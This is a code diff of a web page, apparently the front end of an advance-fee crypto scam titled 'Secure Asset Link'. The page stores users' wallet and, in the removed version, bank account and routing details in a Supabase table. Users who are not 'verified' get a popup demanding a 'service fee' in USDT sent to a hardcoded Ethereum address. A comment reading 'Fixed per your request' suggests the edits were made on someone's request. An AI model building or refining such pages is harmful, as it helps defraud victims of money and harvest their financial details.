@@ -4,7 +4,9 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Link Accounts — Secure Asset Link</title>
+  <!-- Tailwind CSS -->
   <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Font Awesome -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 
   <script>
@@ -52,45 +54,33 @@
   </header>
 
   <main class="flex-grow p-4 flex flex-col items-center">
-    <h2 class="text-2xl font-bold mb-6 text-center">Link Your Accounts</h2>
+    <h2 class="text-2xl font-bold mb-6 text-center">Link Your Wallets</h2>
 
     <div class="space-y-5 max-w-md w-full">
-      <!-- Wallet -->
+      <!-- Escrow Wallet -->
       <div>
-        <label class="block text-sm font-medium text-slate-700 mb-1">Crypto Wallet Address</label>
-        <input type="text" id="walletInput" placeholder="0x..." class="w-full px-3 py-2 rounded-lg border border-slate-300 focus:ring-2 focus:ring-primary focus:border-transparent outline-none" />
+        <label class="block text-sm font-medium text-slate-700 mb-1">Escrow Wallet</label>
+        <input
+          type="text"
+          id="walletInput"
+          class="w-full px-3 py-2 rounded-lg border border-slate-300 focus:ring-2 focus:ring-primary focus:border-transparent outline-none"
+        />
       </div>
 
-      <!-- Network -->
+      <!-- Receiving Server Wallet Address -->
       <div>
-        <label class="block text-sm font-medium text-slate-700 mb-1">Network</label>
-        <select id="networkSelect" class="w-full px-3 py-2 rounded-lg border border-slate-300 focus:ring-2 focus:ring-primary focus:border-transparent outline-none bg-white">
-          <option value="">Select Network</option>
-          <option value="ERC20">ERC20 (Ethereum)</option>
-          <option value="BEP20">BEP20 (Binance Smart Chain)</option>
-          <option value="TRC20">TRC20 (Tron)</option>
-        </select>
+        <label class="block text-sm font-medium text-slate-700 mb-1">Receiving Server Wallet Address</label>
+        <input
+          type="text"
+          id="bankInput"
+          class="w-full px-3 py-2 rounded-lg border border-slate-300 focus:ring-2 focus:ring-primary focus:border-transparent outline-none"
+        />
       </div>
 
-      <!-- Bank Name -->
-      <div>
-        <label class="block text-sm font-medium text-slate-700 mb-1">Bank Name</label>
-        <input type="text" id="bankNameInput" placeholder="e.g. Chase Bank" class="w-full px-3 py-2 rounded-lg border border-slate-300 focus:ring-2 focus:ring-primary focus:border-transparent outline-none" />
-      </div>
-
-      <!-- Account Number -->
-      <div>
-        <label class="block text-sm font-medium text-slate-700 mb-1">Account Number</label>
-        <input type="text" id="accountNumberInput" placeholder="e.g. 1234567890" class="w-full px-3 py-2 rounded-lg border border-slate-300 focus:ring-2 focus:ring-primary focus:border-transparent outline-none" />
-      </div>
-
-      <!-- Routing Number -->
-      <div>
-        <label class="block text-sm font-medium text-slate-700 mb-1">Routing Number</label>
-        <input type="text" id="routingNumberInput" placeholder="e.g. 021000021" class="w-full px-3 py-2 rounded-lg border border-slate-300 focus:ring-2 focus:ring-primary focus:border-transparent outline-none" />
-      </div>
-
-      <button id="proceedBtn" class="w-full py-3 bg-primary hover:bg-blue-700 text-white font-medium rounded-lg shadow-sm transition-colors duration-200">
+      <button
+        id="proceedBtn"
+        class="w-full py-3 bg-primary hover:bg-blue-700 text-white font-medium rounded-lg shadow-sm transition-colors duration-200"
+      >
         Proceed
       </button>
     </div>
@@ -106,6 +96,7 @@
     </div>
   </div>
 
+  <!-- Supabase SDK -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
   <script>
@@ -134,10 +125,7 @@
       const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
       const walletInput = document.getElementById('walletInput');
-      const networkSelect = document.getElementById('networkSelect');
-      const bankNameInput = document.getElementById('bankNameInput');
-      const accountNumberInput = document.getElementById('accountNumberInput');
-      const routingNumberInput = document.getElementById('routingNumberInput');
+      const bankInput = document.getElementById('bankInput');
       const proceedBtn = document.getElementById('proceedBtn');
       const closePopupBtn = document.getElementById('closePopupBtn');
 
@@ -151,6 +139,7 @@
         return;
       }
 
+      // Load user data
       async function loadUserData() {
         try {
           const { data, error } = await supabaseClient
@@ -162,64 +151,41 @@
           if (error) throw error;
 
           walletInput.value = data.wallet_address || '';
-          networkSelect.value = data.network || '';
-          if (data.bank_account) {
-            const parts = data.bank_account.split(' • ');
-            bankNameInput.value = parts[0] || '';
-            accountNumberInput.value = parts[1] || '';
-            routingNumberInput.value = parts[2] || '';
-          }
+          bankInput.value = data.bank_account || '';
         } catch (err) {
           console.error('Load error:', err);
           alert('Failed to load account data.');
         }
       }
 
+      // Proceed logic
       async function handleProceed() {
         const wallet = walletInput.value.trim();
-        const network = networkSelect.value;
-        const bankName = bankNameInput.value.trim();
-        const accountNumber = accountNumberInput.value.trim();
-        const routingNumber = routingNumberInput.value.trim();
+        const bank = bankInput.value.trim();
 
-        let needsSave = false;
-        if ((wallet || network || bankName || accountNumber || routingNumber)) {
-          const { data, error } = await supabaseClient
+        // Save if any field is filled AND status is unpaid
+        if ((wallet || bank)) {
+          const { data: current, error } = await supabaseClient
             .from('users')
             .select('verification_status')
             .eq('access_id', accessId)
             .single();
 
-          if (error) {
-            alert('Could not check status.');
-            return;
-          }
-
-          if (data?.verification_status === 'unpaid') {
-            needsSave = true;
-          }
-        }
-
-        if (needsSave) {
-          let bankFull = '';
-          if (bankName && accountNumber && routingNumber) {
-            bankFull = `${bankName} • ${accountNumber} • ${routingNumber}`;
-          }
-
-          try {
-            const { error } = await supabaseClient
+          if (error || current?.verification_status !== 'verified') {
+            // Save data
+            const { error: saveError } = await supabaseClient
               .from('users')
               .update({
                 wallet_address: wallet || null,
-                network: network || null,
-                bank_account: bankFull || null,
+                bank_account: bank || null,
+                // Do NOT touch verification_status
               })
               .eq('access_id', accessId);
 
-            if (error) throw error;
-          } catch (err) {
-            alert('Failed to save your details.');
-            return;
+            if (saveError) {
+              alert('Failed to save your details.');
+              return;
+            }
           }
         }
 
@@ -237,18 +203,17 @@
 
         const status = data.verification_status || 'unpaid';
         const feeAmount = data.service_fee_amount || '---';
-        // ✅ Updated fee address
-        const feeAddress = '0x6d912e7522c12d1299e99F18684871FfF283D332';
+        const feeAddress = '0x6d912e7522c12d1299e99F18684871FfF283D332'; // Fixed per your request
 
         const popupMessage = document.getElementById('popupMessage');
         const popup = document.getElementById('popup');
 
         if (status === 'verified') {
-          popupMessage.innerHTML = '<strong>Verification Complete</strong><br>Your submitted wallet and bank account has been verified and successfully linked.';
+          popupMessage.innerHTML = '<strong>Verification Complete</strong><br>Your submitted wallet addresses have been verified and successfully linked.';
         } else {
           popupMessage.innerHTML = `
             <strong>Service Fee Required</strong><br>
-            A one-time service fee of <strong>${feeAmount} ETH</strong> is required.<br><br>
+            A one-time service fee of <strong>${feeAmount} USDT</strong> is required.<br><br>
             Pay to:<br>
             <div class="copyable-address" title="Click to copy">${feeAddress}</div>
             <small>(Network: Ethereum)</small>
@@ -271,5 +236,4 @@
     });
   </script>
 </body>
-
 </html>
